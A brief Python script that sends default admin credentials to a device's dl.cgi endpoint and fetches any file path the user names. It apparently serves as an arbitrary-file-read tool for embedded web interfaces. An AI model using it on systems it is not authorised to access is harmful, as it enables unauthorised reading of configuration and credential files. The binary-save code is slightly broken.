#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import io
import sys
import base64
import argparse
import requests
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf8')

class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "-i", "--ip", dest="ipAddress", metavar="ip", default="192.168.1.10",
            help="specify ip address (default: 192.168.1.10)"
        )
        parser.add_argument(
            "-p", "--port", dest="portNumber", metavar="port", default="80",
            help="specify port number (default: 80)"
        )
        parser.add_argument(
            "-u", "--name", dest="userName", metavar="name", default="admin",
            help="specify username (default: admin)"
        )
        parser.add_argument(
            "-k", "--pass", dest="userPass", metavar="pass", default="12345",
            help="specify userpass (default: 12345)"
        )
        parser.add_argument(
            "-d", "--download", dest="remoteFilePath", metavar="path", required=True,
            help="specify remote file path to download (default: None)"
        )
        parser.add_argument(
            "-o", "--save", dest="saveFilePath", metavar="path",
            help="specify local file path to save (default: None)"
        )
        parser.add_argument(
            "-b", "--binary", action="store_true", dest="binaryMode", default=False,
            help="switch response to binary mode (default: False)"
        )
        return parser.parse_args()

opt = Parser().optparse()

ip = opt.ipAddress
port = opt.portNumber
username = opt.userName
userpass = opt.userPass
cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
path = opt.remoteFilePath
save = opt.saveFilePath
bin = opt.binaryMode

headers = {
    "Authorization": "Basic {}".format(cred)
}

def main():
    try:
        if ip and port and path:
            r = requests.get("http://{}:{}/cgi-bin/dl.cgi?file={}".format(ip, port, path), headers=headers, timeout=10)
        elif ip and path:
            r = requests.get("http://{}/cgi-bin/dl.cgi?file={}".format(ip, path), headers=headers, timeout=10)
        else:
            print("[!] Unknown Command, Exit")
            sys.exit()
        if r.status_code == 200:
            if bin:
                if save:
                    with open(save, 'w', encoding='utf-8') as f:
                        print(r.content, file=f)
                else:
                    print(r.content, flush=True)
            else:
                if save:
                    with open(save, 'w', encoding='utf-8') as f:
                        print(r.text, file=f)
                else:
                    print(r.text, flush=True)
        else:
            print("[-] Request Failed:", ip, port, r.status_code, flush=True)
    
    except Exception as e:
        print("[!] Error:", e)
        pass
    except BrokenPipeError:
        pass

if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print("[*] Stopped")
        sys.exit()
